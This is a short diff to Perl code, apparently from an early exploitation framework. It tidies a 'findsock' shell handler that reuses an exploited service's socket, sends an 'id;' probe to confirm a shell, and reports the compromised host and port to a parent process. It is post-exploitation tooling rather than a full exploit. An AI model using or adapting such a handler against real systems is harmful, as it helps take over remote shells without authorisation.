@@ -362,30 +362,28 @@ sub findsock_shell
 
 sub findsock_shell_exp
 {
-    my ($self, $opt, $e) = @_;
-    
-    print STDERR "[*] Debug: opt = $opt (" . join(" ", keys(%{$opt})) . "\n";
-    
+    my ($self, $e) = @_;
+
     # this is our socket to the parent
-    my $s = $self->GetVar->('HPSOCK');
+    my $s = $self->GetVar('HPSOCK');
     Pex::Unblock($s);
     
     # this is our socket to the exploited service
     my $x = $e->get_socket;
+    
+    
+    # print STDERR "DEBUG: self=$self | s=$s | e=$e | x=$x\n";
     
     # send probe string
     $e->send("id;\n");
     
     my $r = $e->recv(1);
     
-    print STDERR "[*] r = '$r' ($!)\n";
-    
     if ($r =~ /uid|internal or external/)
     {
         print $s "Shell on " . $x->peerhost . ":" . $x->peerport . "\n";
         
         print STDERR "[*] Findsock payload successful: $r";
-        print STDERR "[*] Waiting for parent to respond...\n";
 
         $r = <$s>;
         while (! defined($r)) { $r = <$s>; select(undef, undef, undef, 0.1) }
